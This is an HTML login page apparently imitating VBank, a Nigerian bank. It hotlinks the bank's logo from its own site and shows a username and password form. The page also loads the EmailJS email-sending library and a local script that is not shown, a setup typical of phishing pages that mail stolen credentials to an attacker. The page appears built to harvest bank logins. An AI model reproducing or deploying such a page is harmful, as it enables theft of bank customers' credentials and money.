<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <link
      rel="icon"
      href="https://vbank.ng/vbank-staging/wp-content/uploads/2020/10/v_logo2.svg"
      sizes="32x32"
    />
    <link
      rel="icon"
      href="https://vbank.ng/vbank-staging/wp-content/uploads/2020/10/v_logo2.svg"
      sizes="192x192"
    />
    <title>Vbank - VBank</title>
    <link
      rel="stylesheet"
      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css"
      integrity="sha512-z3gLpd7yknf1YoNbCzqRKc4qyor8gaKU1qmn+CShxbuBusANI9QpRohGBreCFkKxLhei6S9CQXFEbbKuqLg0DA=="
      crossorigin="anonymous"
      referrerpolicy="no-referrer"
    />
    <link rel="stylesheet" href="/Styles/style.css" />
  </head>
  <body>
    <div class="container">
      <div class="contentSec">
        <div class="logo">
          <img
            src="https://vbank.ng/vbank-staging/wp-content/uploads/2020/10/VBANK-TRANSPARENT-02.png"
            alt="logo"
          />
        </div>
        <div class="title">Welcome to V!</div>
      </div>
      <div class="loginWrapper">
        <div class="loginSec">
          <form method="post" id="myForm">
            <div class="formInput">
              <input
                id="email"
                name="username"
                type="email"
                placeholder="Username or Email"
                required
              />
            </div>
            <div class="formInput">
              <input
                id="password"
                name="password"
                type="password"
                placeholder="Password"
                required
              />
              <i class="fa-regular fa-eye"></i>
            </div>
            <div class="fp">Forgot Password</div>

            <button type="submit">Sign In</button>
          </form>
          <div class="createACC">
            <a href="#">Create account</a>
            <h5>V3.1.1</h5>
          </div>
        </div>
      </div>
    </div>

    <!-- Add this to the head of your HTML file -->
    <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
    <script src="/Js/script.js"></script>
  </body>
</html>
